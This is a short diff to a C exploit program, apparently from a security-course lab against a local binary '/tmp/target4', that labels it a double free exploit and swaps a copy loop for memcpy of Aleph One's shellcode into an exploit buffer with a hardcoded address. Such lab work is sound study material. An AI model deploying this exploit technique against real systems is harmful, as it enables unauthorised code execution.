@@ -7,6 +7,10 @@
 #define TARGET "/tmp/target4"
 #define EGG_SIZE 1024
 
+/* 
+ * Main idea of exploit:
+ *     This double free exploit. 
+ */
 
 int main(void)
 {
@@ -14,7 +18,6 @@ int main(void)
   char *env[1];
   long shellcodeAddr, *addrPtr, fpAddr, dummyVal, jumpInstr;
   char egg[EGG_SIZE]; /* string containing exploit code */
-  char *ptr;
   int i;
 
   shellcodeAddr = 0x08049C68; // address of buff
@@ -34,9 +37,7 @@ int main(void)
 
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = &egg[8];
-  for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
+  memcpy (egg + 8, shellcode, strlen (shellcode));
 
   egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
   
